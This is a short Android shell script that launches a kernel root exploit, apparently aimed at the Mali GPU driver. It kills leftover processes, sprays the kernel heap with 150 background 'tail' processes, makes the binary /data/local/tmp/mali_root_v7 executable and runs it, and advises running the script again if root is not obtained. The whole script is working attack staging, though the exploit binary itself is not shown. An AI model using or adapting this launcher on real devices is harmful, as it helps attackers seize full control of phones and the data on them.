#!/system/bin/sh
DIR="/data/local/tmp"
BIN="$DIR/mali_root_v7"

echo "[*] Cleaning up old processes..."
killall tail 2>/dev/null
killall sleep 2>/dev/null

echo "[*] Spraying kernel heap (150 processes)..."
for i in $(seq 1 150); do
    tail -f /dev/null &
done

echo "[*] Launching exploit..."
chmod 777 "$BIN"
"$BIN"

echo "[!] Exploit exited. If you aren't root, try running this script again."
